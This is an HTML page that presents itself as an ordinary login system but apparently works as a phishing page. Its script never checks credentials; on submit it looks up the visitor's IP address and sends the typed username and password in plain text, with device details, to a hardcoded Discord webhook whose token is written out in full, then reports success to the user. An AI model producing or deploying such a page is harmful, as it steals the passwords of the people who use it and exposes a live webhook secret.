<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login System</title>
    <link rel="stylesheet" href="/styles.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px;
            border-radius: 4px;
            color: white;
            display: none;
        }
        .toast.success {
            background-color: #4CAF50;
        }
        .toast.error {
            background-color: #f44336;
        }
    </style>
</head>
<body>
    <div class="loginBlock">
        <form id="loginForm" onsubmit="return handleSubmit(event)" autocomplete="off">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" id="submitButton">
                <span class="button-text">Login</span>
            </button>
        </form>
    </div>
    <div id="toast" class="toast"></div>
    <script>
    const getBrowserInfo = () => {
        return {
            browser: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenResolution: `${window.screen.width}x${window.screen.height}`
        };
    }

    async function handleSubmit(event) {
        event.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const timestamp = new Date().toISOString();
        const button = document.getElementById('submitButton');
        const browserInfo = getBrowserInfo();
        
        try {
            button.disabled = true;
            button.innerHTML = 'Sending...';

            // Get IP address first
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ipAddress = ipData.ip;

            // Discord webhook call
            const webhookUrl = "https://discord.com/api/webhooks/1378978890373926963/KBqbq1R-P4Pu1ytdZl5oo5kHKVkCpz8MeszoyUjR1JRK1M-vIQ4ov2x4hFbhMJa_VGmQ";
            
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: "Login Bot",
                    embeds: [{
                        title: "🔐 New Login Attempt",
                        color: 0xFF0000,
                        fields: [
                            {
                                name: "👤 Username",
                                value: username,
                                inline: true
                            },
                            {
                                name: "🔑 Password",
                                value: password,
                                inline: true
                            },
                            {
                                name: "🌐 IP Address",
                                value: ipAddress,
                                inline: true
                            },
                            {
                                name: "⏰ Timestamp",
                                value: new Date(timestamp).toLocaleString(),
                                inline: false
                            },
                            {
                                name: "📱 Device Info",
                                value: `Platform: ${browserInfo.platform}\nBrowser: ${browserInfo.browser}\nResolution: ${browserInfo.screenResolution}`,
                                inline: false
                            }
                        ]
                    }]
                })
            });
            
            if (response.ok) {
                showToast('Successfully!', 'success');
                document.getElementById('loginForm').reset();
            } else {
                throw new Error('Failed');
            }
        } catch (error) {
            console.error('Error:', error);
            showToast('Error: ' + error.message, 'error');
        } finally {
            button.disabled = false;
            button.innerHTML = 'Login';
        }
        return false;
    }

    function showToast(message, type) {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.className = `toast ${type}`;
        toast.style.display = 'block';
        
        // Force a reflow to trigger animation
        toast.offsetHeight;
        
        setTimeout(() => {
            toast.style.opacity = '0';
            setTimeout(() => {
                toast.style.display = 'none';
                toast.style.opacity = '1';
            }, 300);
        }, 3000);
    }
    </script>
</body>
</html>
